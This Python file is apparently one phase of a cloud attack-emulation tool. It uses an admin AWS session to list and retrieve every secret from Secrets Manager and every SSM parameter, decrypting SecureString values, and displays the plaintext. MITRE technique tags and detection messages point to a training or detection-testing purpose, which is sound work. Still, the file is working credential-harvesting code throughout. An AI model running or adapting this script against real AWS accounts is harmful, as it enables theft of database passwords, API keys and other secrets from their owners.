"""
exfiltrate.py -- Phase 3: Data Exfiltration (Secret Harvesting)

With admin access obtained in Phase 2, the attacker harvests all secrets
from AWS Secrets Manager and SSM Parameter Store. In the real attack,
the attacker also searched CloudWatch Logs for embedded credentials.

MITRE ATT&CK Techniques:
  - T1555.006: Cloud Secrets Management Stores (Secrets Manager + SSM)
"""
import json
from typing import Any, Dict, List

import botocore

from config import AttackConfig
from utils import (
    console,
    format_table,
    log_event,
    print_detection,
    print_error,
    print_info,
    print_step,
    print_success,
    print_warning,
)


def harvest_secrets_manager(
    config: AttackConfig,
) -> List[Dict[str, Any]]:
    """
    List and retrieve all secrets from AWS Secrets Manager.

    With AdministratorAccess, GetSecretValue returns the plaintext
    value of any secret, regardless of resource-based policies.

    MITRE: T1555.006 (Cloud Secrets Management Stores)

    Args:
        config: The attack configuration (admin session required).

    Returns:
        List of dicts with Name, Description, and SecretValue for each secret.
    """
    print_step(1, "Harvesting secrets from Secrets Manager")
    admin = config.require_admin_session()
    sm = admin.client("secretsmanager")

    # List all secrets
    secrets_list = sm.list_secrets().get("SecretList", [])
    print_info(f"Found {len(secrets_list)} secrets")

    harvested = []
    for secret_meta in secrets_list:
        name = secret_meta["Name"]
        description = secret_meta.get("Description", "")
        try:
            value_resp = sm.get_secret_value(SecretId=name)
            secret_value = value_resp.get("SecretString", "<binary>")

            # Try to parse JSON secrets for pretty display
            try:
                parsed = json.loads(secret_value)
                display_value = json.dumps(parsed, indent=2)
            except (json.JSONDecodeError, TypeError):
                display_value = secret_value

            harvested.append({
                "Name": name,
                "Description": description,
                "Value": secret_value,
                "DisplayValue": display_value,
            })
            print_success(f"  Retrieved: {name}")
        except botocore.exceptions.ClientError as exc:
            print_error(f"  Failed to retrieve {name}: {exc}")
            harvested.append({
                "Name": name,
                "Description": description,
                "Value": f"ERROR: {exc}",
                "DisplayValue": f"ERROR: {exc}",
            })

    print_detection(
        "CDR",
        "Bulk GetSecretValue calls from admin user at unusual IP",
    )
    print_detection(
        "DSPM",
        "Mass access to secrets containing database credentials and API keys",
    )
    return harvested


def harvest_ssm_parameters(
    config: AttackConfig,
) -> List[Dict[str, Any]]:
    """
    List and retrieve all SSM Parameter Store parameters, including
    decryption of SecureString values.

    With admin access, the --with-decryption flag automatically uses
    the KMS key to decrypt SecureString parameters.

    MITRE: T1555.006 (Cloud Secrets Management Stores)

    Args:
        config: The attack configuration (admin session required).

    Returns:
        List of dicts with Name, Type, and Value for each parameter.
    """
    print_step(2, "Harvesting secrets from SSM Parameter Store")
    admin = config.require_admin_session()
    ssm = admin.client("ssm")

    # List all parameters
    params_list = ssm.describe_parameters().get("Parameters", [])
    print_info(f"Found {len(params_list)} parameters")

    harvested = []
    for param_meta in params_list:
        name = param_meta["Name"]
        param_type = param_meta.get("Type", "")
        try:
            value_resp = ssm.get_parameter(
                Name=name,
                WithDecryption=True,  # Decrypts SecureString with KMS
            )
            value = value_resp["Parameter"]["Value"]
            harvested.append({
                "Name": name,
                "Type": param_type,
                "Value": value,
            })
            print_success(f"  Retrieved: {name} ({param_type})")
        except botocore.exceptions.ClientError as exc:
            print_error(f"  Failed to retrieve {name}: {exc}")
            harvested.append({
                "Name": name,
                "Type": param_type,
                "Value": f"ERROR: {exc}",
            })

    print_detection(
        "CDR",
        "Bulk GetParameter calls with decryption from unusual principal",
    )
    return harvested


def display_harvested_secrets(
    secrets: List[Dict[str, Any]],
    parameters: List[Dict[str, Any]],
) -> None:
    """
    Format and display all harvested secrets and parameters in tables.

    Args:
        secrets: List of Secrets Manager results.
        parameters: List of SSM Parameter Store results.
    """
    print_step(3, "Displaying all harvested data")

    if secrets:
        rows = []
        for s in secrets:
            # Truncate long values for display
            display_val = s["DisplayValue"]
            if len(display_val) > 80:
                display_val = display_val[:77] + "..."
            rows.append([s["Name"], s["Description"], display_val])
        table = format_table(
            "Secrets Manager -- Harvested Secrets",
            ["Secret Name", "Description", "Value (truncated)"],
            rows,
            ["bright_cyan", "dim", "bright_red"],
        )
        console.print(table)

    if parameters:
        rows = []
        for p in parameters:
            display_val = p["Value"]
            if len(display_val) > 80:
                display_val = display_val[:77] + "..."
            rows.append([p["Name"], p["Type"], display_val])
        table = format_table(
            "SSM Parameter Store -- Harvested Parameters",
            ["Parameter Name", "Type", "Value (truncated)"],
            rows,
            ["bright_cyan", "bright_yellow", "bright_red"],
        )
        console.print(table)

    total = len(secrets) + len(parameters)
    print_success(
        f"Total secrets harvested: {total} "
        f"({len(secrets)} from SM, {len(parameters)} from SSM)"
    )


def run_phase(config: AttackConfig) -> Dict[str, Any]:
    """
    Execute the complete Phase 3: Data Exfiltration.

    Returns a dict with all harvested secrets and parameters.
    """
    from utils import print_phase_banner

    print_phase_banner(3, "DATA EXFILTRATION")

    results = {}
    results["secrets"] = harvest_secrets_manager(config)
    results["parameters"] = harvest_ssm_parameters(config)
    display_harvested_secrets(results["secrets"], results["parameters"])

    from utils import mark_phase_complete
    mark_phase_complete(3)

    return results
